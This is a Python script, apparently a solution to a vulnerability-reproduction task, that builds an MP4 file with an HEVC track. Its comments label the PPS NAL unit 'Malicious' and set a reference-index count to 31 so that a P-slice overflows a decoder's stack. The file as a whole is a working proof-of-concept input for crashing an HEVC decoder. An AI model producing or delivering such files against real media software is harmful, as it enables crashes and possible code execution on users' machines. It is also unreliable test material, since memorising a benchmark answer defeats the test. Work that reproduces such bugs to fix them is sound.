import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper functions
        def u32(x): return struct.pack(">I", x)
        def u16(x): return struct.pack(">H", x)
        def u8(x): return struct.pack(">B", x)
        def box(name, data): return u32(len(data) + 8) + name.encode('latin1') + data
        def fbox(name, v, f, data): return box(name, u8(v) + u32(f)[1:] + data)

        # Standard Identity Matrix for headers (16.16 format for 1.0, 2.30 for last element)
        matrix = (
            u32(0x00010000) + u32(0) + u32(0) +
            u32(0) + u32(0x00010000) + u32(0) +
            u32(0) + u32(0) + u32(0x40000000)
        )

        # 1. HEVC Config (hvcC)
        # SPS NAL (Type 33) - Valid minimal Main Profile
        sps_data = bytes.fromhex("42 01 01 01 60 00 00 00 00 00 00 00 00 1E C0 82 04 17 2F FC 20")
        
        # PPS NAL (Type 34) - Malicious
        # num_ref_idx_l0_default_active_minus1 set to 31 (trigger)
        pps_data = bytes.fromhex("44 01 C0 02 0C 40")

        hvcc_content = (
            b'\x01' # Version
            b'\x01\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1E' # PTL
            b'\xF0\x00\xFC\xFD\xF8\xF8\x00\x00\x0F\x02' # Common fields
            b'\xA1\x00\x01' + u16(len(sps_data)) + sps_data
            b'\xA2\x00\x01' + u16(len(pps_data)) + pps_data
        )
        hvcc_box = box('hvcC', hvcc_content)

        # 2. Sample Entry (hvc1)
        hvc1_content = (
            b'\x00'*6 + b'\x00\x01' + b'\x00\x00' + b'\x00\x00' + b'\x00'*12 +
            u16(64) + u16(64) + u32(0x00480000) + u32(0x00480000) +
            b'\x00'*4 + u16(1) + b'\x00'*32 + u16(24) + u16(65535) +
            hvcc_box
        )
        hvc1_box = box('hvc1', hvc1_content)

        # 3. Sample Data (Slice P-Type, PPS 0)
        # Uses PPS defaults -> large reference list -> stack overflow
        slice_nal = bytes.fromhex("02 01 D4 1B")
        sample_data = u32(len(slice_nal)) + slice_nal

        # 4. Box Construction
        ftyp = box('ftyp', b'isom\x00\x00\x02\x00isomiso2mp41')
        
        # mvhd
        mvhd = fbox('mvhd', 0, 0, 
            u32(0) + u32(0) + u32(1000) + u32(100) + 
            u32(0x00010000) + u16(0x0100) + b'\x00'*10 + 
            matrix + 
            b'\x00'*24 + u32(2)
        )

        # tkhd
        tkhd = fbox('tkhd', 0, 3,
            u32(0) + u32(0) + u32(1) + u32(0) + u32(100) +
            b'\x00'*12 + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00' + 
            matrix +
            u32(64<<16) + u32(64<<16)
        )

        mdhd = fbox('mdhd', 0, 0, u32(0)*2 + u32(1000) + u32(100) + u16(0) + u16(0))
        hdlr = fbox('hdlr', 0, 0, u32(0) + b'vide' + b'\x00'*12 + b'VideoHandler\x00')
        vmhd = fbox('vmhd', 0, 1, u16(0) + u16(0)*3)
        dinf = box('dinf', fbox('dref', 0, 0, u32(1) + fbox('url ', 0, 1, b'')))

        stsd = fbox('stsd', 0, 0, u32(1) + hvc1_box)
        stts = fbox('stts', 0, 0, u32(1) + u32(1) + u32(100))
        stsc = fbox('stsc', 0, 0, u32(1) + u32(1) + u32(1) + u32(1))
        stsz = fbox('stsz', 0, 0, u32(0) + u32(1) + u32(len(sample_data)))
        
        # Calculate offsets
        stco_dummy = fbox('stco', 0, 0, u32(1) + u32(0))
        stbl_dummy = box('stbl', stsd + stts + stsc + stsz + stco_dummy)
        minf_dummy = box('minf', vmhd + dinf + stbl_dummy)
        mdia_dummy = box('mdia', mdhd + hdlr + minf_dummy)
        trak_dummy = box('trak', tkhd + mdia_dummy)
        moov_dummy = box('moov', mvhd + trak_dummy)
        
        offset = len(ftyp) + len(moov_dummy) + 8 # 8 bytes for mdat header
        
        stco = fbox('stco', 0, 0, u32(1) + u32(offset))
        stbl = box('stbl', stsd + stts + stsc + stsz + stco)
        minf = box('minf', vmhd + dinf + stbl)
        mdia = box('mdia', mdhd + hdlr + minf)
        trak = box('trak', tkhd + mdia)
        moov = box('moov', mvhd + trak)
        
        mdat = box('mdat', sample_data)
        
        return ftyp + moov + mdat